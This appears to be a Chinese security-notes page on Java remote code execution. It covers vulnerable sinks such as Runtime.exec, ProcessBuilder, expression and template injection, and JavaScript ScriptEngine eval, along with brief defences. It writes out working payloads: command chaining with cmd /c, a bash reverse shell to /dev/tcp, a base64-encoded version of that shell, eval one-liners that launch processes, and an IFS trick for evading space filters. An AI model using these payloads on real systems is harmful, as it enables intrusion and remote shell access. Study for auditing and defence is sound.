场景：
  1、服务端直接存在可执行函数（ProcessBuilder()、exec()等）,且对传入的参数过滤不严格导致RCE漏洞。
  2、由表达式注入导致的RCE漏洞，如：OGNL(struts2)、SpEL(spring)、MVEL、EL、Fel、JSTL+EL等。
  3、由java后端模板引擎SSTI注入导致的RCE漏洞，如：Freemarker、Velocity、Thymeleaf等。
  4、由java一些脚本语言引起的RCE漏洞，如：Groovy、JavascriptEngine等。
  5、由第三方开源组件引起的RCE漏洞，如：Fastjson、Shiro、Xstream、Struts2等。
  6、关键词：ProcessBuilder、start、Runtime、getRuntime、exec等。    
危害：远程代码执行、远程命令执行、写入木马等。
防御：过滤用户可控的参数，升级组件版本或更换等。

^
## **原生命令执行**
原生命令执行的方式有两种：
第一种：
```
Runtime.getRuntime().exec("cmd /c ping 127.0.0.1 && dir");
//有/c或者linux的-c参数就可以命令拼接。c告诉cmd.exe 执行字符串指定的命令。
//exec()可以接收字符串，以及字符串数组等。
```


注意java这里反弹shell需要改良

```
Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");

bash -i >& /dev/tcp/ip/port 0>&1 需要base64编码再执行下面：

bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
```


第二种：
```
new ProcessBuilder("calc").start();
ProcessBuilder("ping", ip);  //这里的ip无法拼接命令。
当ProcessBuilder("cmd", "/c", "dir && calc");//时，这里可以拼接命令。
ProcessBuilder("cmd", "/c", "ping",ip);

注意在get请求中不要用&&作为拼接符号，用||前报错后执行。
```

^
## **利用JS引擎ScriptEngineManager代码执行**
在爬虫中常常用python实现远程执行js代码。
在java中也可以js代码，js如果可控，可能执行java对象代码。
>jdk17 ScriptEngineManager默认不在支持javascript，解决：
```
<dependency>
    <groupId>org.openjdk.nashorn</groupId>
    <artifactId>nashorn-core</artifactId>
    <version>15.3</version>
</dependency>
```
关键词：ScriptEngineManager
```
 // 创建一个 ScriptEngineManager 实例
        ScriptEngineManager manager = new ScriptEngineManager();

        // 通过 ScriptEngineManager 获取一个 JavaScript 引擎实例
        ScriptEngine engine = manager.getEngineByName("JavaScript");

        // 检查是否成功获取引擎
        if (engine != null) {
            System.out.println("JavaScript 引擎已成功加载。");
        } else {
            System.out.println("未能加载 JavaScript 引擎。");
        }

        try {
            String test = "var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec(\"calc\"); };";
// 若test可控，则代码执行
            engine.eval(test);
        }catch (Exception e){

        }
```
一句
```
new javax.script.ScriptEngineManager().getEngineByName("javascript").eval("java.lang.Runtime.getRuntime().exec('calc')");
```



^
## **拓展**
在java后台系统中工作流流程任务功能中，有的支持js脚本，就是这个实现的。
其实流程脚本任务不仅支持JS脚本，还支持Python，Groovy等脚本，其底层原理则是调用java中对应语言的解析函数，如JS脚本则是调用了ScriptEngine中的eval函数。据了解，流程引擎还支持表达式解析，所以该组件还存在其它的注入可能，以上仅对脚本注入的攻击形式进行了简单的探讨。这样的漏洞适用于几乎所有集成流程管理功能的系统，比如若依、Guss等系统均存在此类问题。
执行python：<https://blog.csdn.net/anlegor/article/details/44086367>


PS：Flowable 工作流引擎支持多种脚本语言，Flowable 原生支持 JavaScript、Groovy 和 JUEL，可以也试试python，而java11以上又默认不支持JavaScript，考虑Groovy和JUEL。



^
# 替换空格，绕过StringTokenizer

Linux下使用： ${IFS} 、 $IFS$9 windows下使用： %IFS% 、 %IFS%9

# criptEngineManager 参考文档

<https://xz.aliyun.com/t/8567?time__1311=n4%2BxnD0DcDuD907GkWD%2Fia%2BeYqhjrCQWiSReD>

# Groovy代码注入

<https://xz.aliyun.com/t/8231?time__1311=n4%2BxnD0Dc7eYuxmqGNnmDUx%2FRKDtKD9ACoD>

# scriptengine任意命令执行

<https://github.com/yzddmr6/Java-Js-Engine-Payloads?tab=readme-ov-file#js%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E5%AD%97%E8%8A%82%E7%A0%81>

# 实际案例

<https://github.com/JPressProjects/jpress/issues/171>

